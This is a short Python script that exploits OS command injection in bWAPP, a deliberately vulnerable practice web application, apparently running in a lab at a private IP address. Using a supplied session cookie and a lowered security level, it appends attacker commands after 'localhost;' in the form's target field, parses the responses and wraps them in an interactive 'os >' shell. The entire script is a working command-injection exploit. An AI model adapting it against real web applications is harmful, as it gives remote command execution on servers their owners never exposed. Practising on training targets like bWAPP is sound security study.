#!/usr/bin/python3

import requests, sys, cmd

def os_command(command):
#	command = sys.argv[1]
	cookies = {"PHPSESSID":f"{sys.argv[1]}", "security_level":"0"}
	data = {
		"target":"localhost;%s" %command,
		"form":"submit"
		}

	r = requests.post("http://192.168.100.32/bWAPP/commandi.php", cookies=cookies, data=data)
	out = (r.text).split("</p>")
	out = out[1].split("127.0.0.1")
	return f"\n{out[1].strip()}\n"

class bwapp(cmd.Cmd):
	prompt = "os > "
	def default(self, args):
		print(os_command(args))

if __name__=="__main__":
	if len(sys.argv) != 2:
		print(f"./{sys.argv[0]} <PHPSESSID>")
	else:
		bwapp().cmdloop()
